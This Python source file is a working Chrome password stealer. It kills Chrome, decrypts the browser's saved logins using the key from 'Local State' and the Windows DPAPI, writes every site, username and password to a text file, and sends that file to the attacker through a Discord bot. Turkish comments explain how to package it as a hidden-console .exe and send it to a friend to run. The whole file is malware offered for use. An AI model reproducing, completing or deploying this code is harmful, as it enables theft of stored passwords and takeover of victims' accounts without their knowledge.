import discord
from discord.ext import commands
import base64,sqlite3,os,json,psutil
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# pip install pyinstaller ~~kurmadan önce konsola bunu yapıştır
# pyinstaller --onefile --noconsole main.py ~~kurmak için bunu konsola yapıştır oluşan dist klasöründeki .exe uzantıyı arkadaşına yolla!

TOKEN = 'tokenishere' # your bot token id / botunuzun tokenini girin.
discordUserID = 0 # your discord user id / kullanıcı id'nizi girin.

required_packages = ["discord", "pycryptodome", "psutil", "pypiwin32"]


def kill_chrome():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if 'chrome' in proc.info['name'].lower():
                print(f"Chrome found, killing process PID: {proc.info['pid']}")
                proc.kill()  # Chrome'u kapat
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

kill_chrome()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def get_decryption_key():
    local_state_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()

    local_state = json.loads(local_state_data)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    decrypted_key = CryptUnprotectData(key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(encrypted_password, key):
    try:
        nonce = encrypted_password[3:15]
        ciphertext = encrypted_password[15:-16] 
        tag = encrypted_password[-16:]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
        
        return decrypted_password.decode()
    except Exception as e:
        return None

login_data_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
conn = sqlite3.connect(login_data_path)
cursor = conn.cursor()

cursor.execute("SELECT action_url, username_value, password_value FROM logins")
decryption_key = get_decryption_key()

cookies_by_site = {}

kill_chrome()

for result in cursor.fetchall():
    url = result[0]
    username = result[1]
    encrypted_password = result[2]

    try:
        decrypted_password = decrypt_password(encrypted_password, decryption_key)
        if decrypted_password:
            domain = url.split("//")[-1].split("/")[0]

            if domain not in cookies_by_site:
                cookies_by_site[domain] = []

            cookies_by_site[domain].append((username, decrypted_password))
    except Exception as e:
        print(f"Şifre çözme hatası: {e}")

with open("decrypted_passwords.txt", "w", encoding="utf-8") as f:
    f.write("DECRYPTED CHROME PASSWORDS\n\n")

    for site, credentials in cookies_by_site.items():
        f.write(f"## {site.upper()} ##\n")
        for username, password in credentials:
            f.write(f"Site: {site} Kullanıcı Adı: {username} Şifre: {password}\n")
        f.write("\n" + "="*50 + "\n")

conn.close()

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')

    user_id = discordUserID 
    user = await bot.fetch_user(user_id)

    decrypted_file_path = 'decrypted_passwords.txt'
    if os.path.exists(decrypted_file_path):
        with open(decrypted_file_path, 'rb') as f:
            await user.send("Here is the decrypted password file:", file=discord.File(f, decrypted_file_path))
        print("File sent successfully.")
    else:
        print("Decrypted file not found!")

    await bot.close()

kill_chrome() 

bot.run(TOKEN)
